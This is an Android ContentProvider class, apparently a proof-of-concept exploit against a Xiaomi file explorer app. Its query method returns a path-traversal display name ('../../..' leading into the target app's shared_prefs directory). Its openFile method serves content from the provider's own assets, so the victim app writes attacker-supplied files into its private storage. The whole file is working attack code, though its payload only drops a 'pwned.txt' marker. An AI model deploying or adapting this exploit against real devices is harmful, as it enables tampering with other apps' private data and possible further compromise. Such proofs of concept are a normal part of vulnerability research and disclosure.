package com.fileexplorer.exploit;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.content.res.AssetManager;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.ParcelFileDescriptor;

import androidx.annotation.NonNull;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;

public class MyContentProvider extends ContentProvider {
    @Override
    public boolean onCreate() {
//        try {
//            File file = new File(getContext().getFilesDir(), "pwned.txt");
//            FileOutputStream fos = new FileOutputStream(file);
//            String exploitContent = "This is the content to be written in pwned.txt.";
//            fos.write(exploitContent.getBytes());
//            fos.close();
//        } catch (IOException e) {
//            e.printStackTrace();
//        }
        return true;
    }

    @Override
    public Cursor query(@NonNull Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
        MatrixCursor cursor = new MatrixCursor(new String[]{"_display_name", "size", "_data"});
        cursor.addRow(new Object[]{"../../../../../../../../../../../data/user/0/com.mi.android.globalFileexplorer/shared_prefs/pwned.txt", 0, ""});
        return cursor;
    }

    @Override
    public String getType(@NonNull Uri uri) {
        return null;
    }

    @Override
    public Uri insert(@NonNull Uri uri, ContentValues values) {
        return null;
    }

    @Override
    public int delete(@NonNull Uri uri, String selection, String[] selectionArgs) {
        return 0;
    }

    @Override
    public int update(@NonNull Uri uri, ContentValues values, String selection, String[] selectionArgs) {
        return 0;
    }

    @Override
    public ParcelFileDescriptor openFile(Uri uri, @NonNull String mode) throws FileNotFoundException {
        String filename = uri.getLastPathSegment();
        AssetManager assetManager = getContext().getAssets();

        File file = new File(getContext().getFilesDir(), filename);
        if (!file.exists()){
            try (InputStream is = assetManager.open(filename);
            FileOutputStream fos = new FileOutputStream(file)){
                byte[] buffer = new byte[1024];
                int bytesRead;

                while ((bytesRead = is.read(buffer)) != -1){
                    fos.write(buffer,0,bytesRead);
                }
            }catch (IOException e){
                e.printStackTrace();
            }
        }
//        try {
//            file.createNewFile();
//        } catch (IOException e) {
//            e.printStackTrace();
//        }
        return ParcelFileDescriptor.open(file, ParcelFileDescriptor.MODE_READ_ONLY);
    }
}
